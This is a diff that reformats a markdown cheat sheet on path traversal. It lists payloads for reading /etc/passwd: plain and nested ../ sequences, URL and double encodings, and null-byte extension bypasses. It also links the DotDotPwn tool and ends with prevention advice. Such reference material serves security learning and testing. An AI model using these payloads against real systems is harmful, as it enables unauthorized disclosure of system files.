@@ -1,26 +1,34 @@
-Payloads 
-/ : absolute routes
+## Payloads 
+
+### absolute routes
+/
 Ex: /etc/passwd
 
-// : absolute routes for non recursive filtering systems
+### absolute routes for non recursive filtering systems
+// 
 Ex: /etc/passwd
 
-../../../etc/passwd : Normal traversal characters
+### Normal traversal characters
+../../../etc/passwd 
 ....//....//...//....//
 
-URL Encoding
+### URL Encoding
 ../ as %2e%2e%2f 
 
-URL Double Encoding 
+### URL Double Encoding 
 %25%32%65%25%32%65%25%32%66
 
 An application may require the user-supplied filename to end with an expected file extension, 
 such as .png. In this case, it might be possible to use a null byte to effectively terminate 
-the file path before the required extension. For example: filename=../../../etc/passwd%00.png.
+the file path before the required extension. 
 
-../../../etc/passwd%00.jpg
+> For example: filename=../../../etc/passwd%00.png.
+> ../../../etc/passwd%00.jpg
 
-How to prevent a path traversal attack
+## Tools 
+[DotDotPwn](https://github.com/wireghoul/dotdotpwn)
+
+## How to prevent a path traversal attack
 
 The most effective way to prevent path traversal vulnerabilities is to avoid passing user-supplied input 
 to filesystem APIs altogether. 
